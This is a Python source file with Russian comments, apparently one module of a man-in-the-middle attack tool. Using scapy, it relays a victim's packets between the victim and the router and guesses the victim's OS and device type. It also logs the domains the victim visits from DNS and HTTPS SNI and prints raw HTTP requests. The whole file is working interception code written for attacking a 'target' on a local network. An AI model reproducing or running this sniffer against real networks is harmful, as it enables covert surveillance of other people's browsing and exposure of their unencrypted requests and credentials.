"""
Monitor — перехват и анализ трафика цели.

Что делает:
- User-space packet forwarding (пересылка между целью и роутером)
- OS fingerprinting по TTL
- DNS-перехват с фильтром мусора
- HTTPS SNI-сниффинг
- HTTP raw-перехват
- Определение модели устройства по DNS-запросам
"""

from __future__ import annotations

import time
from threading import Thread
from typing import Optional, Callable

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.layers.dns import DNSQR
from scapy.layers.tls.all import TLS
from scapy.sendrecv import sniff, sendp

TRASH_DOMAINS: tuple[str, ...] = (
    "microsoft", "google", "gvt2", "akamaized",
    "live.com", "bing", "msedge", "msft",
)


def forward_packet(pkt, target_ip: str, target_mac: str,
                   my_mac: str, router_mac: str, my_ip: str) -> None:
    """Переслать пакет между целью и роутером (user-space forwarding)."""
    if not pkt.haslayer(IP):
        return

    src = pkt[IP].src
    dst = pkt[IP].dst
    my_network_prefix = my_ip.rsplit(".", 1)[0]

    # От цели → роутеру
    if src == target_ip and not dst.startswith(my_network_prefix):
        pkt[Ether].dst = router_mac
        pkt[Ether].src = my_mac
        sendp(pkt, verbose=False)

    # От роутера → цели
    elif dst == target_ip:
        pkt[Ether].dst = target_mac
        pkt[Ether].src = my_mac
        sendp(pkt, verbose=False)


def packet_callback(pkt, is_attacking: Callable[[], bool],
                    target_info: dict, found_devices: list,
                    query_log: list, on_monitor_log: Optional[Callable[[str], None]]) -> None:
    """Обработчик каждого перехваченного пакета."""
    if not is_attacking():
        return

    t_ip = target_info.get("ip")
    if not t_ip:
        return

    # ---- OS fingerprinting (TTL) ----
    if pkt.haslayer(IP) and pkt[IP].src == t_ip:
        ttl = pkt[IP].ttl
        if target_info.get("os") is None:
            if ttl <= 64:
                detected_os = "Linux / Android / iOS"
            elif ttl <= 128:
                detected_os = "Windows"
            else:
                detected_os = "Unknown"
            target_info["os"] = detected_os
            target_info["packets"] = target_info.get("packets", 0) + 1
            if on_monitor_log:
                on_monitor_log(f"ℹ️ ОС цели определена: {detected_os}")

        # ---- Model detection via DNS ----
        payload = ""
        if pkt.haslayer(DNSQR):
            payload = str(pkt[DNSQR].qname)

        detected_model: Optional[str] = None
        if "apple.com" in payload or "icloud.com" in payload:
            detected_model = "Apple Device"
        elif "android.clients.google.com" in payload:
            detected_model = "Android Smartphone"
        elif "windowsupdate.com" in payload or "msedge.net" in payload:
            detected_model = "Windows PC"
        elif "play.googleapis.com" in payload:
            detected_model = "Android Smartphone"

        if detected_model and target_info.get("model") is None:
            target_info["model"] = detected_model
            if on_monitor_log:
                on_monitor_log(f"📱 ТИП УСТРОЙСТВА: {detected_model}")
            for d in found_devices:
                if d["ip"] == t_ip:
                    base = d["name"].replace("Unknown Device", "").strip()
                    d["name"] = f"[{detected_model}] {base}".strip()
                    break

    # ---- Forward all traffic ----
    forward_packet(
        pkt, t_ip,
        target_info.get("mac", ""),
        target_info.get("_my_mac", ""),
        target_info.get("_router_mac", ""),
        target_info.get("_my_ip", ""),
    )

    # ---- DNS capture ----
    if pkt.haslayer(DNSQR):
        query = pkt[DNSQR].qname.decode(errors="ignore").strip(".")

        if not any(t in query for t in TRASH_DOMAINS):
            if query not in query_log:
                query_log.append(query)
                if len(query_log) > 20:
                    query_log.pop(0)
                t_str = time.strftime("%H:%M:%S")
                if on_monitor_log:
                    on_monitor_log(f"[{t_str}] ЦЕЛЬ ПЕРЕШЛА: {query}")

    # ---- HTTPS SNI ----
    if (pkt.haslayer(IP) and pkt.haslayer(TCP)
            and pkt[TCP].dport == 443 and pkt.haslayer(TLS)):
        try:
            server_name = (
                pkt[TLS].msg[0].ext[0].server_names[0]
                .hostname.decode(errors="ignore")
            )
            if server_name not in query_log:
                query_log.append(server_name)
                if len(query_log) > 20:
                    query_log.pop(0)
                if on_monitor_log:
                    on_monitor_log(f"🔒 HTTPS: {server_name}")
        except Exception:
            pass

    # ---- HTTP raw ----
    if pkt.haslayer(IP) and pkt.haslayer("Raw"):
        raw = pkt["Raw"].load.decode(errors="ignore")
        if raw.startswith(("GET ", "POST ", "PUT ", "DELETE ")):
            if on_monitor_log:
                on_monitor_log(f"\n[!] HTTP-запрос:\n{raw[:200]}")


def start_monitor_sniffer(target_ip: str,
                          is_attacking_ref: Callable[[], bool],
                          target_info: dict,
                          found_devices: list,
                          query_log: list,
                          on_monitor_log: Optional[Callable[[str], None]]) -> Thread:
    """Запустить сниффер трафика цели в отдельном потоке.

    Returns:
        Thread: поток-сниффер (daemon)
    """
    sniff_thread = Thread(
        target=lambda: sniff(
            filter=f"host {target_ip}",
            prn=lambda pkt: packet_callback(
                pkt, is_attacking_ref, target_info,
                found_devices, query_log, on_monitor_log,
            ),
            store=0,
        ),
        daemon=True,
    )
    sniff_thread.start()
    return sniff_thread